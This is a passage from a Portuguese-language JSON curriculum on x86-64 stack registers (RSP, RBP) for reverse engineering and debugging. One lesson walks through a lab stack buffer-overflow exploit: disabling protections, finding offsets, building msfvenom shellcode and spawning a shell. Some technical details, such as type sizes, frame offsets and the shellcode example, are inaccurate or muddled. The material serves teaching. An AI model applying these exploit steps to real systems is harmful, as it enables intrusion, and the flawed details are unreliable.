                                    "Simule sequências PUSH/POP em um emulador ou debugger.",
                                    "Observe impactos em funções como prologue/epilogue.",
                                    "Registre mudanças no valor de RSP para diferentes tamanhos de operandos."
                                  ],
                                  "verification": "Execute PUSH/POP em GDB e confirme mudanças no valor de RSP com 'info registers rsp'.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GDB ou x64dbg",
                                    "Código assembly simples com PUSH/POP",
                                    "Exemplos de man pages para push/pop"
                                  ],
                                  "tips": "Use 'x/10gx $rsp' no GDB para inspecionar conteúdo da stack após operações.",
                                  "learningObjective": "Prever e rastrear mudanças no RSP durante PUSH e POP.",
                                  "commonMistakes": "Esquecer alinhamento de 16 bytes em chamadas de função ou ignorar operandos de 32/64 bits."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar Dumps de Memória para Identificar Atividades do RSP",
                                  "subSteps": [
                                    "Carregue um dump de memória de um processo (core dump ou minidump).",
                                    "Localize o valor atual de RSP no contexto do thread.",
                                    "Identifique padrões de stack frames próximos ao RSP.",
                                    "Correlacione valores de RSP com chamadas de função recentes.",
                                    "Diferencie stack de heap analisando regiões de memória."
                                  ],
                                  "verification": "Aponte no dump onde RSP está e explique 2-3 frames acima dele.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramentas como Volatility, Rekall ou WinDbg",
                                    "Core dump de um binário ELF/PE simples",
                                    "Documentação de formatos core/minidump"
                                  ],
                                  "tips": "Filtre por regiões RW (read-write) para focar na stack.",
                                  "learningObjective": "Extrair e interpretar valores de RSP de dumps de memória.",
                                  "commonMistakes": "Confundir RSP com outros registradores como RIP ou confundir stack com seções de dados."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Rastrear Alocações na Stack em Código Assembly de Binários ELF/PE",
                                  "subSteps": [
                                    "Desmonte um binário ELF/PE com objdump ou IDA Pro.",
                                    "Identifique prologue de funções: sub rsp, N para alocações locais.",
                                    "Rastreie fluxos PUSH/POP ao longo de uma função.",
                                    "Simule execução passo a passo rastreando RSP.",
                                    "Valide com debugger em binário real."
                                  ],
                                  "verification": "Anote sequência de mudanças de RSP em uma função desmontada e reproduza em debugger.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "objdump, Ghidra ou IDA Free",
                                    "Binário ELF/PE de exemplo (e.g., hello world com locals)",
                                    "GDB/WinDbg para stepping"
                                  ],
                                  "tips": "Procure padrões como 'sub rsp, 0x20' para frames locais.",
                                  "learningObjective": "Rastrear dinamicamente o RSP em assembly para entender alocações de stack.",
                                  "commonMistakes": "Ignorar otimizações que eliminam PUSH/POP ou confundir com alocações dinâmicas (malloc)."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar Integração Completa com Cenários de Análise",
                                  "subSteps": [
                                    "Combine dump e assembly: encontre RSP em dump e trace de volta ao código.",
                                    "Analise um binário com overflow intencional para ver RSP manipulado.",
                                    "Crie relatório resumindo papel do RSP na operação observada.",
                                    "Teste em binários Windows (PE) vs Linux (ELF).",
                                    "Discuta variações em multi-thread (GS segment em Windows)."
                                  ],
                                  "verification": "Produza um relatório de 1 página rastreando RSP em um cenário completo.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Binários de teste vulneráveis (e.g., de DVWA ou retos CTF)",
                                    "Debugger avançado como x64dbg",
                                    "Templates de relatório"
                                  ],
                                  "tips": "Use breakpoints condicionais no RSP para pausar em mudanças específicas.",
                                  "learningObjective": "Aplicar conhecimento de RSP em análises reais de binários.",
                                  "commonMistakes": "Não considerar ASLR ou stack canaries que mascaram valores reais."
                                }
                              ],
                              "practicalExample": "Em um dump de core de um binário ELF vulnerável a buffer overflow, RSP=0x7ffc12345678 aponta para o topo da stack. Após PUSH rbp, RSP decrementa para 0x7ffc12345670. Analisando assembly, sub rsp,0x20 aloca espaço local; rastreando POPs restaura RSP original, revelando return address overwrite.",
                              "finalVerifications": [
                                "Explicar verbalmente como PUSH decrementa RSP e POP incrementa.",
                                "Identificar RSP em um dump de memória fornecido.",
                                "Rastrear mudanças de RSP em snippet de assembly de 20 linhas.",
                                "Diferenciar uso de RSP em ELF vs PE.",
                                "Simular stack overflow impactando RSP em debugger.",
                                "Prever valor final de RSP após sequência PUSH/POP dada."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de mudanças de RSP (PUSH: -8 bytes, POP: +8 bytes).",
                                "Capacidade de localizar e interpretar RSP em dumps reais.",
                                "Correta correlação entre assembly e valores de memória.",
                                "Identificação de erros comuns como desalinhamento de stack.",
                                "Relatório claro com diagramas rastreando RSP.",
                                "Aplicação em contextos ELF/PE sem confusões."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de stack em context switches.",
                                "Programação em C: Alocações locais e chamadas de função.",
                                "Reverse Engineering: Uso de RSP em desmontagem dinâmica.",
                                "Segurança: Detecção de exploits baseados em stack via RSP."
                              ],
                              "realWorldApplication": "Em análise forense de malware ou pentesting, rastrear RSP em dumps ajuda a identificar ROP chains em exploits, buffer overflows ou shellcodes, permitindo detecção de intrusões em binários reais de produção."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.1.2",
                            "name": "Executar PUSH e POP manipulando RSP",
                            "description": "Escrever e depurar código assembly que usa instruções PUSH/POP para alterar o RSP, simulando cenários de overflow na stack e verificando mudanças no registrador via ferramentas como GDB.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de desenvolvimento para Assembly x86-64",
                                  "subSteps": [
                                    "Instale o assembler NASM: sudo apt install nasm",
                                    "Instale o depurador GDB: sudo apt install gdb",
                                    "Instale o linker ld e gcc para linking: sudo apt install build-essential",
                                    "Crie um diretório de trabalho e um arquivo de teste básico em assembly",
                                    "Compile um programa 'Hello World' em assembly para validar o ambiente"
                                  ],
                                  "verification": "Execute 'nasm -f elf64 teste.asm -o teste.o && ld teste.o -o teste && ./teste' sem erros",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Linux Ubuntu ou similar",
                                    "NASM",
                                    "GDB",
                                    "Editor de texto (VS Code ou Vim)"
                                  ],
                                  "tips": [
                                    "Use um ambiente virtual como Docker para isolar dependências",
                                    "Verifique a arquitetura com 'uname -m' para confirmar x86_64"
                                  ],
                                  "learningObjective": "Preparar o ambiente necessário para escrever, compilar e depurar código assembly",
                                  "commonMistakes": [
                                    "Esquecer de instalar pacotes 32-bit em sistemas 64-bit",
                                    "Usar flags erradas para NASM (-f elf em vez de -f elf64)",
                                    "Não configurar PATH corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Escrever código assembly básico com instruções PUSH e POP",
                                  "subSteps": [
                                    "Escreva um programa que inicia com section .text e global _start",
                                    "Use PUSH para empilhar valores constantes na stack (ex: push 0x1, push 0x2)",
                                    "Use POP para desempilhar e mover para registradores (ex: pop rax)",
                                    "Adicione sys_exit para finalizar o programa corretamente",
                                    "Compile e execute para observar comportamento inicial"
                                  ],
                                  "verification": "O programa compila e executa sem crash, verificando valores em registradores com 'objdump -d programa'",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "NASM",
                                    "ld",
                                    "objdump"
                                  ],
                                  "tips": [
                                    "Lembre-se que PUSH decrementa RSP em 8 bytes (x86_64)",
                                    "Use registradores como RAX para armazenar valores popados"
                                  ],
                                  "learningObjective": "Dominar a sintaxe e efeito básico de PUSH/POP no RSP",
                                  "commonMistakes": [
                                    "Confundir ordem de empilhamento (LIFO)",
                                    "Não alinhar stack adequadamente",
                                    "Usar push/pop com registradores errados sem syscall"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Observar mudanças no RSP durante execução",
                                  "subSteps": [
                                    "Execute o programa com GDB: gdb ./programa",
                                    "Defina breakpoint no início: break _start",
                                    "Use 'run', então 'stepi' para avançar instrução por instrução",
                                    "Monitore RSP com 'info registers rsp' após cada PUSH/POP",
                                    "Registre os valores de RSP em um log manual"
                                  ],
                                  "verification": "RSP diminui em 8 bytes por PUSH e aumenta por POP, confirmado no GDB",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GDB"
                                  ],
                                  "tips": [
                                    "Use 'x/10gx $rsp' para examinar conteúdo da stack",
                                    "Ative 'set disassembly-flavor intel' para sintaxe familiar"
                                  ],
                                  "learningObjective": "Visualizar dinamicamente como PUSH/POP alteram o Stack Pointer",
                                  "commonMistakes": [
                                    "Não usar 'stepi' e pular instruções",
                                    "Ignorar desalinhamento de stack",
                                    "Confundir RSP com RBP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular overflow na stack e depurar",
                                  "subSteps": [
                                    "Modifique o código para múltiplos PUSH sem POP correspondente (ex: 100 pushes)",
                                    "Execute no GDB e observe RSP aproximando-se de limites baixos",
                                    "Simule overflow forçando PUSH excessivos até segment fault",
                                    "Use 'watch $rsp' para breakpoints em mudanças de RSP",
                                    "Analise o core dump com 'gdb programa core' para inspecionar crash"
                                  ],
                                  "verification": "GDB detecta segment violation e RSP está fora dos limites esperados da stack",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GDB",
                                    "ulimit -c unlimited para core dumps"
                                  ],
                                  "tips": [
                                    "Ajuste tamanho da stack com 'ulimit -s 65536'",
                                    "Compare RSP inicial e final para quantificar overflow"
                                  ],
                                  "learningObjective": "Identificar e depurar cenários de stack overflow usando PUSH/POP",
                                  "commonMistakes": [
                                    "Não habilitar core dumps",
                                    "PUSH valores grandes causando desalinhamento imediato",
                                    "Ignorar proteções ASLR"
                                  ]
                                }
                              ],
                              "practicalExample": "Código assembly: section .text; global _start; _start: push 0x4141414141414141; push 0x4242424242424242; pop rax; pop rbx; mov rax, 60; xor rdi, rdi; syscall; Compile com nasm -f elf64 ex.asm -o ex.o; ld ex.o -o ex; gdb ./ex - exibe RSP mudando de 0x7fffffffe000 para 0x7fffffffdff8 após pushes.",
                              "finalVerifications": [
                                "RSP decrementa exatamente 8 bytes por PUSH em x86_64",
                                "POP restaura RSP e carrega valor corretamente em registrador",
                                "Múltiplos PUSH sem POP causam overflow detectável por GDB",
                                "Watchpoints no RSP disparam em mudanças esperadas",
                                "Core dump revela endereço de RSP inválido em overflow",
                                "Programa básico PUSH/POP executa sem erros"
                              ],
                              "assessmentCriteria": [
                                "Código assembly compila e executa corretamente",
                                "Uso preciso de GDB para monitorar RSP (stepi, info registers)",
                                "Identificação correta de overflow (mudança > limite stack)",
                                "Log detalhado de valores RSP antes/depois de instruções",
                                "Explicação verbal de LIFO na stack",
                                "Depuração de erro simulado com sucesso"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender chamadas de função e stack frames",
                                "Sistemas Operacionais: Gerenciamento de memória e proteções stack",
                                "Segurança Computacional: Buffer overflows e ROP exploits",
                                "Arquitetura de Computadores: Registradores e modelo de stack"
                              ],
                              "realWorldApplication": "Em reverse engineering e análise de malware, depurar binários para detectar overflows em chamadas de sistema; em pentesting, simular exploits de stack smashing manipulando RSP para bypass de proteções como Canary."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.1.3",
                            "name": "Explorar RSP em buffer overflow",
                            "description": "Analisar como manipular o RSP em shellcodes para redirecionar o fluxo de execução, identificando offsets na stack em exemplos de binários vulneráveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o papel do RSP na stack e em buffer overflows",
                                  "subSteps": [
                                    "Estude a estrutura da stack em x86_64, focando no RSP como ponteiro para o topo da stack.",
                                    "Analise diagramas de stack antes e depois de um buffer overflow.",
                                    "Revise conceitos de frame pointer (RBP) e como RSP é usado em chamadas de função.",
                                    "Identifique como overflow pode sobrescrever o valor salvo de RSP.",
                                    "Pratique visualizando a stack em diagramas interativos."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como um buffer overflow altera o RSP e redireciona o fluxo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação Intel x86_64 manuals",
                                    "Diagramas de stack (ex: online tools como stackoverflow visuals)"
                                  ],
                                  "tips": "Use ferramentas como o site 'x86 calling conventions' para visualizações claras.",
                                  "learningObjective": "Entender o mecanismo fundamental do RSP em exploits de stack.",
                                  "commonMistakes": [
                                    "Confundir RSP com RBP",
                                    "Ignorar alinhamento da stack em 8 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente de análise com GDB e binário vulnerável",
                                  "subSteps": [
                                    "Compile um binário C vulnerável com buffer overflow (ex: strcpy sem bounds).",
                                    "Instale e configure GDB com extensões como gef ou pwndbg.",
                                    "Execute o binário no GDB e defina breakpoints na função vulnerável.",
                                    "Use comandos 'info registers rsp' e 'x/20gx $rsp' para inspecionar a stack.",
                                    "Teste input básico para causar overflow e observe mudanças no RSP."
                                  ],
                                  "verification": "Capture screenshot mostrando RSP alterado após overflow no GDB.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GCC compiler",
                                    "GDB com pwndbg",
                                    "Código fonte C vulnerável (ex: vuln.c com main e strcpy)"
                                  ],
                                  "tips": "Compile com '-fno-stack-protector -z execstack' para desabilitar proteções.",
                                  "learningObjective": "Configurar um ambiente reproduzível para análise de RSP.",
                                  "commonMistakes": [
                                    "Esquecer flags de compilação",
                                    "Não usar ASLR off (setarch -R)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar offsets na stack para manipulação do RSP",
                                  "subSteps": [
                                    "Use 'pattern_create' do pwndbg para gerar input único e encontrar offset exato do RSP.",
                                    "Calcule o offset do return address na stack usando 'cyclic' ou manualmente.",
                                    "Examine o layout da stack com 'info frame' e 'disassemble' no GDB.",
                                    "Anote posições relativas: buffer, saved RBP, saved RSP/return address.",
                                    "Teste payloads parciais para confirmar offsets precisos."
                                  ],
                                  "verification": "Demonstre encontrar o offset correto causando crash controlado no RSP.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "pwndbg ou gef no GDB",
                                    "Ferramenta cyclic/pattern_create"
                                  ],
                                  "tips": "Use 'vmmap' para verificar layout de memória e alinhamentos.",
                                  "learningObjective": "Precisar calcular offsets para targeting preciso do RSP.",
                                  "commonMistakes": [
                                    "Offset incorreto por alinhamento",
                                    "Confundir little-endian"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar e testar shellcode que manipula RSP para redirecionar execução",
                                  "subSteps": [
                                    "Escreva shellcode em assembly que ajusta RSP (ex: sub rsp, offset; jmp rel_addr).",
                                    "Gere shellcode com msfvenom ou nasm e injete no payload de overflow.",
                                    "Teste no GDB: execute payload, observe RSP redirecionado e shell spawn.",
                                    "Debugue falhas com 'stepi' e 'ni' para rastrear RSP.",
                                    "Refine shellcode para bypass simples (ex: null-free)."
                                  ],
                                  "verification": "Execute exploit com sucesso, spawnando shell via manipulação RSP.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "msfvenom",
                                    "GDB",
                                    "Netcat para testar shell"
                                  ],
                                  "tips": "Inicie com shellcode simples como 'execve(/bin/sh)' ajustando RSP.",
                                  "learningObjective": "Implementar manipulação prática do RSP em shellcode.",
                                  "commonMistakes": [
                                    "Shellcode com nulos",
                                    "RSP desalinhado causando segfault"
                                  ]
                                }
                              ],
                              "practicalExample": "Considere um binário vuln.c: int main() { char buf[64]; gets(buf); }. Compile sem proteções. Offset para return addr é 72 bytes. Payload: 'A'*72 + shellcode que faz 'sub rsp, 0x10; jmp 0x401000' para pular ROP gadget, redirecionando para system('/bin/sh'). No GDB: rsp antes=0x7fffffffdc50, após=0x7fffffffdc40, execução redirecionada.",
                              "finalVerifications": [
                                "Explicar como RSP é sobrescrito em overflow.",
                                "Identificar offset correto em binário customizado.",
                                "Criar shellcode que ajusta RSP e spawna shell.",
                                "Debugar falha de RSP no GDB.",
                                "Descrever impacto de ASLR em RSP.",
                                "Reproduzir exploit em 2 binários diferentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de offsets (erro <5 bytes).",
                                "Shellcode funcional sem crashes iniciais.",
                                "Explicação clara do fluxo RSP -> redirecionamento.",
                                "Uso correto de ferramentas GDB/pwndbg.",
                                "Tratamento de erros comuns (alinhamento, endianness).",
                                "Tempo de execução dentro do estimado."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly (escrever shellcode).",
                                "Sistemas Operacionais (gerenciamento de stack).",
                                "Engenharia Reversa (disassembly com objdump/Ghidra).",
                                "Programação em C (vulnerabilidades de buffer).",
                                "Redes (testar shells reversos)."
                              ],
                              "realWorldApplication": "Em pentests e CTFs, manipular RSP permite bypass de proteções como stack canaries em binários vulneráveis, explorando serviços reais como web servers ou setuid binaries para ganho de privilégios."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.2.2",
                        "name": "Registrador RBP (Base Pointer)",
                        "description": "O registrador RBP atua como ponteiro base para frames de pilha em funções, permitindo acesso relativo a variáveis locais e parâmetros. É essencial na engenharia reversa para entender estruturas de controle de pilha em assembly 64 bits.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.2.1",
                            "name": "Configurar e restaurar stack frames com RBP",
                            "description": "Examinar sequências como 'push rbp; mov rbp, rsp; ... leave; ret' em código desmontado, identificando setup e teardown de frames em funções recursivas ou aninhadas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Básicos de Stack Frames e Registradores RSP/RBP",
                                  "subSteps": [
                                    "Estude o funcionamento do stack em x86-64: RSP aponta para o topo do stack, crescendo para baixo.",
                                    "Aprenda que RBP é o Base Pointer, usado para criar um frame de referência estável no stack.",
                                    "Identifique diferenças: RSP muda com push/pop, RBP permanece fixo durante a função para acesso relativo.",
                                    "Revise convenções de chamada System V ABI para x86-64, onde prologue salva RBP.",
                                    "Examine diagrama de stack frame: old RBP, parâmetros, locals, saved RSP."
                                  ],
                                  "verification": "Desenhe um diagrama de stack frame antes/depois do prologue e explique offsets relativos a RBP.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 manuals (Vol. 1)",
                                    "Ferramenta de desenho como Draw.io",
                                    "Exemplos de assembly simples"
                                  ],
                                  "tips": "Visualize o stack como uma pilha de pratos; RBP marca o 'prato' da função atual.",
                                  "learningObjective": "Explicar o papel de RSP e RBP na manutenção de stack frames hierárquicos.",
                                  "commonMistakes": [
                                    "Confundir RSP com RBP: RSP é dinâmico, RBP é âncora.",
                                    "Ignorar direção de crescimento do stack (para baixo).",
                                    "Esquecer salvamento de RBP para funções aninhadas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Analisar o Prologue de Stack Frame",
                                  "subSteps": [
                                    "Localize sequências no disassembly: 'push rbp' salva RBP antigo no stack.",
                                    "Identifique 'mov rbp, rsp' que atualiza RBP para o novo frame.",
                                    "Observe alocações subsequentes: 'sub rsp, N' para espaço de locals.",
                                    "Registre mudanças em RSP/RBP usando ferramentas como objdump ou Ghidra.",
                                    "Compare com variações: alguns usam 'enter' instrui, mas foque em push/mov padrão."
                                  ],
                                  "verification": "No disassembly de uma função, destaque as linhas do prologue e trace valores de RSP/RBP.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário de teste compilado com gcc -O0",
                                    "Ghidra ou IDA Free para disassembly",
                                    "GDB para stepping"
                                  ],
                                  "tips": "Use -fno-omit-frame-pointer no gcc para garantir prologue explícito.",
                                  "learningObjective": "Reconhecer e dissecar o setup de stack frame em código desmontado.",
                                  "commonMistakes": [
                                    "Interpretar 'push rbp' como inicialização em vez de salvamento.",
                                    "Não notar 'sub rsp' como parte do frame setup.",
                                    "Confundir com prologue otimizado em -O2."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Teardown e Restauração do Stack Frame",
                                  "subSteps": [
                                    "Identifique 'leave': equivalente a 'mov rsp, rbp; pop rbp'.",
                                    "Observe 'ret': pop do endereço de retorno após restauração.",
                                    "Compare com forma explícita: 'mov rsp, rbp; pop rbp; ret'.",
                                    "Verifique preservação: RBP restaurado deve matching o valor salvo.",
                                    "Simule execução passo a passo para validar restauração."
                                  ],
                                  "verification": "Execute função no GDB, breakpoint no epilogue, confirme RSP/RBP restaurados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "Binário com função de teste",
                                    "Referência de instruções x86-64"
                                  ],
                                  "tips": "GDB command: 'info registers rsp rbp' antes/depois do epilogue.",
                                  "learningObjective": "Identificar e validar o processo de restauração de stack frames.",
                                  "commonMistakes": [
                                    "Confundir 'leave' com 'ret' sozinho.",
                                    "Não verificar se RSP é restaurado corretamente, levando a stack corruption.",
                                    "Ignorar impacto em funções chamadas."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Análise em Funções Recursivas ou Aninhadas",
                                  "subSteps": [
                                    "Compile função recursiva (ex: factorial) e desmonte.",
                                    "Trace múltiplos frames: cada recursão cria novo frame com push rbp/mov rbp,rsp.",
                                    "Identifique unwind: epilogues restauram frames na ordem LIFO.",
                                    "Analise overflows potenciais em recursão profunda via stack traces.",
                                    "Use ferramentas para visualizar call stack com frames RBP."
                                  ],
                                  "verification": "Desmonte recursão, liste frames stacked e simule unwind completo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Código C recursivo",
                                    "gcc para gerar binário",
                                    "Ghidra com recursion graph",
                                    "pwndbg GDB plugin"
                                  ],
                                  "tips": "Limite recursão para evitar stack overflow durante testes.",
                                  "learningObjective": "Analisar stack frames em cenários complexos como recursão.",
                                  "commonMistakes": [
                                    "Perder track de frames múltiplos.",
                                    "Assumir RSP em vez de RBP para unwind.",
                                    "Não considerar otimizações que removem frames."
                                  ]
                                }
                              ],
                              "practicalExample": "Considere factorial recursivo desmontado:\nprologue: push rbp; mov rbp, rsp; sub rsp, 16\n... corpo: call factorial (cria frame filho)\nepílogo: leave; ret\nEm recursão, frames empilham via prologue, desempilham via epílogo, preservando RBP chain.",
                              "finalVerifications": [
                                "Identificar prologue e epílogo em qualquer função desmontada.",
                                "Trace mudanças RSP/RBP em GDB para uma função recursiva.",
                                "Desenhar stack diagram para 3 níveis de recursão.",
                                "Explicar por que RBP chaining permite stack unwinding em crashes.",
                                "Detectar ausência de prologue (otimizado) e implicações.",
                                "Simular buffer overflow impactando RBP saved."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de instruções prologue/epílogo (100%).",
                                "Correta explicação de offsets relativos a RBP.",
                                "Análise correta de frames múltiplos em recursão.",
                                "Uso apropriado de ferramentas como GDB/Ghidra.",
                                "Identificação de erros comuns como stack misalignment.",
                                "Clareza em diagramas e traces."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como -fomit-frame-pointer afeta debugging.",
                                "Debugging e Ferramentas: Uso de GDB backtrace via RBP chain.",
                                "Segurança Computacional: Exploits de stack (ret2libc) exploram frame setup.",
                                "Arquitetura de Computadores: Convenções ABI e calling conventions.",
                                "Análise Reversa: Reconstruir código fonte de disassembly frames."
                              ],
                              "realWorldApplication": "Em análise de malware ou reverse engineering, identificar stack frames com RBP permite mapear funções recursivas, detectar overflows em exploits, e reconstruir call graphs para entender comportamento malicioso em binários desmontados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.2.2",
                            "name": "Acessar variáveis locais via offsets do RBP",
                            "description": "Calcular e interpretar endereços como [rbp - 0x10] para variáveis locais ou [rbp + 0x8] para parâmetros, aplicando em análise de binários com IDA Pro ou Ghidra.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Stack Frame e o Papel do RBP",
                                  "subSteps": [
                                    "Estude a convenção de chamada x86-64: push rbp; mov rbp, rsp.",
                                    "Analise como sub rsp, N cria espaço para variáveis locais.",
                                    "Visualize o stack frame: RBP aponta para o base, locais abaixo (negativos), parâmetros acima (positivos).",
                                    "Identifique o saved RBP em [rbp] e return address em [rbp + 8].",
                                    "Desenhe um diagrama simples de um stack frame com 2 variáveis locais."
                                  ],
                                  "verification": "Descreva verbalmente ou por escrito o layout do stack frame para uma função com duas variáveis int.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 ABI",
                                    "Diagrama interativo de stack frame (ex: online tools como Godbolt)",
                                    "Compilador GCC para gerar assembly"
                                  ],
                                  "tips": [
                                    "Lembre-se: stack cresce para baixo (endereços menores). Use GDB para observar em runtime: info frame."
                                  ],
                                  "learningObjective": "Explicar como o RBP estabelece a referência para acessos à stack.",
                                  "commonMistakes": [
                                    "Confundir RSP (stack pointer dinâmico) com RBP (base fixo)",
                                    "Ignorar alinhamento de 8 bytes em x64",
                                    "Assumir convenções de 32-bit em 64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Convenções de Offsets para Locais e Parâmetros",
                                  "subSteps": [
                                    "Memorize: variáveis locais em [rbp - offset], parâmetros em [rbp + 0x8 + offset] (primeiro param após return addr).",
                                    "Estude exemplos: int local1 (rbp-4), char local2 (rbp-8) em 32-bit vs. 64-bit.",
                                    "Diferencie System V ABI (Linux): params em registradores primeiro, depois stack.",
                                    "Liste offsets cumulativos: cada var alinha a 8 bytes, somando tamanhos anteriores.",
                                    "Pratique identificando em assembly gerado de C simples."
                                  ],
                                  "verification": "Classifique instruções como mov rax, [rbp-0x10] como acesso a local ou param.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Exemplos de assembly de funções C (Godbolt.org)",
                                    "Tabela de calling conventions x86-64"
                                  ],
                                  "tips": [
                                    "Offsets são sempre múltiplos de 8 em x64 para alinhamento. Conte de baixo para cima para locals."
                                  ],
                                  "learningObjective": "Distinguir offsets negativos (locais) de positivos (params) no contexto do RBP.",
                                  "commonMistakes": [
                                    "Esquecer +8 para return address antes de params",
                                    "Não considerar registradores para primeiros params (RDI, RSI, etc.)",
                                    "Confundir com convenções Windows x64"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular Offsets Manualmente a Partir de Código Fonte",
                                  "subSteps": [
                                    "Compile um C com múltiplas vars/params: int a; char b[10]; void foo(int x, char* y).",
                                    "Gere assembly com gcc -S -O0 para preservar stack usage.",
                                    "Calcule offsets: some tamanhos (int=8, char*=8, array=16 com padding).",
                                    "Verifique com GDB: break na func, info locals, compare com [rbp - calc].",
                                    "Ajuste para otimização: note como -O2 pode usar registradores."
                                  ],
                                  "verification": "Calcule e valide offset para terceira variável local em um exemplo dado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GCC/Clang",
                                    "GDB debugger",
                                    "Editor de texto para C/ASM"
                                  ],
                                  "tips": [
                                    "Use size_t para tamanhos exatos. Padding alinha a 8/16 bytes: sizeof + ajuste."
                                  ],
                                  "learningObjective": "Calcular offsets precisos baseados em declarações de variáveis.",
                                  "commonMistakes": [
                                    "Subestimar padding/alignment",
                                    "Calcular de RSP em vez de RBP",
                                    "Ignorar variáveis não usadas otimizadas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e Navegar Offsets em IDA Pro ou Ghidra",
                                  "subSteps": [
                                    "Carregue um binário em IDA/Ghidra, vá para função main ou similar.",
                                    "Identifique prologue: push rbp; mov rbp,rsp; sub rsp,N.",
                                    "Selecione instruções [rbp +/- off], use 'y' (IDA) ou rename para nomear vars.",
                                    "Crie structs locais via Local Types (Ghidra) ou Local Variables (IDA).",
                                    "Trace fluxos: veja pushes/pops e acessos dinâmicos."
                                  ],
                                  "verification": "Renomeie 3 vars locais em uma função desmontada e explique seus offsets.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "IDA Free/Pro ou Ghidra",
                                    "Binário de teste simples (ex: crackme ou seu próprio exe)"
                                  ],
                                  "tips": [
                                    "Em IDA, F5 para pseudocódigo mostra vars nomeadas. Cross-ref com X para usos."
                                  ],
                                  "learningObjective": "Aplicar conhecimento de offsets em ferramentas de RE para análise estática.",
                                  "commonMistakes": [
                                    "Não aplicar nomes aos offsets (fica sub_<hex>)",
                                    "Confundir com acessos globais/heap",
                                    "Ignorar funções aninhadas (RBP chain)"
                                  ]
                                }
                              ],
                              "practicalExample": "Considere C: int foo(int param1, char* param2) { int local1 = 42; char local2[16]; ... } Assembly: sub rsp, 0x20; mov [rbp-0x4], edi (param1); mov [rbp-0x14], rsi (param2 ajustado); mov DWORD [rbp-0x8], 0x2a (local1=42). Acesse local1 via [rbp-0x8], local2 via [rbp-0x18] (com padding).",
                              "finalVerifications": [
                                "Calcule offset correto para uma variável local de 16 bytes após duas ints.",
                                "Identifique param2 em [rbp + 0x10] em um frame padrão.",
                                "Em GDB, leia/escreva [rbp-0x10] e confirme valor.",
                                "Em Ghidra/IDA, renomeie uma var local e veja pseudocódigo atualizar.",
                                "Explique diferença de offsets em frames recursivos.",
                                "Trace um buffer overflow usando offsets calculados."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos cálculos de offsets (erro <1 byte).",
                                "Correta distinção entre locais/params em 80% dos exemplos.",
                                "Efetiva renomeação e navegação em IDA/Ghidra.",
                                "Uso correto de verificações em GDB (info registers, x/10gx $rbp).",
                                "Identificação de erros comuns como alignment em cenários dados.",
                                "Explicação clara de stack frame em diagrama próprio."
